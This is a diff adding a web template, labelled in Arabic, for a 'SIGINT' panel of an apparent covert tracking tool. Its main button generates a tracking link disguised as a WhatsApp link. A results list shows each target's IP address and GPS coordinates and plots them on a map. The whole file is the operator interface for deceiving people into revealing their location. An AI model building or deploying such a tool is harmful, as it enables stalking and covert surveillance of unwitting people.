@@ -1,0 +1,77 @@
+{% extends "base.html" %}{% set active='sigint' %}
+{% block content %}
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+<div class="card" style="border-color:var(--warn);">
+<h2 style="color:var(--warn)">📡 محرك الاستطلاع الراديوي (SIGINT)</h2>
+</div>
+
+<div class="card" style="border-color:var(--accent)">
+<h2>🛰️ تتبع الموقع الجغرافي (GPS)</h2>
+<button onclick="genLink()" style="width:100%; background:var(--warn); color:#000; font-weight:bold; padding:15px;">🎭 توليد رابط تتبع (يظهر كواتساب)</button>
+<div id="genResult" class="status" style="display:none;margin-top:12px"></div>
+<button onclick="loadResults()" style="margin-top:10px">🔄 تحديث النتائج</button>
+<div id="resultsList" class="status" style="margin-top:12px">لا توجد نتائج بعد.</div>
+</div>
+
+<div class="card" id="mapCard" style="display:none;">
+<h2>🗺️ الخريطة التفاعلية</h2>
+<div id="map" style="height:350px; border-radius:10px; z-index:1;"></div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+let map = null;
+let marker = null;
+
+async function genLink(){
+  const d = await api("/api/link/generate", {method:"POST"});
+  if(d.success){
+    const el = document.getElementById("genResult");
+    el.style.display = "block";
+    // نعرض الرابط المموه (واتساب) افتراضياً
+    el.innerHTML = '<b>✅ رابط التمويه (واتساب) جاهز:</b><br><input type="text" value="'+d.cloaked+'" readonly onclick="this.select()" style="margin-top:8px; color:var(--ok); font-size:16px; direction:ltr;">';
+  }
+}
+
+async function loadResults(){
+  setLoading("resultsList");
+  const d = await api("/api/link/results");
+  if(!d || d.length === 0){ setHTML("resultsList", "لا توجد نتائج."); return; }
+  
+  let html = "";
+  let latestCoords = null;
+  d.forEach(r => {
+    html += '<div class="list-item" style="border-right:3px solid #00c8ff">';
+    html += '<b>ID: '+r.id+'</b> | IP: '+r.ip+'<br>';
+    if(r.lat !== "pending" && r.lat !== "denied"){
+      html += '📍 <b style="color:var(--ok)">'+r.lat+', '+r.lon+'</b><br>';
+      html += '<button onclick="showOnMap('+r.lat+', '+r.lon+', \''+r.ip+'\')" style="padding:5px;font-size:12px;margin-top:5px">🗺️ الخريطة</button>';
+      latestCoords = {lat: parseFloat(r.lat), lon: parseFloat(r.lon), ip: r.ip};
+    } else {
+      html += '<span style="color:var(--bad)">بانتظار موافقة الموقع</span>';
+    }
+    html += '</div>';
+  });
+  setHTML("resultsList", html);
+  if(latestCoords) showOnMap(latestCoords.lat, latestCoords.lon, latestCoords.ip);
+}
+
+function showOnMap(lat, lon, ip){
+  document.getElementById("mapCard").style.display = "block";
+  if(!map){
+    map = L.map('map').setView([lat, lon], 15);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+  } else {
+    map.setView([lat, lon], 15);
+    if(marker) map.removeLayer(marker);
+  }
+  marker = L.marker([lat, lon]).addTo(map)
+    .bindPopup('<b>'+ip+'</b><br>'+lat+', '+lon).openPopup();
+}
+
+loadResults();
+</script>
+{% endblock %}
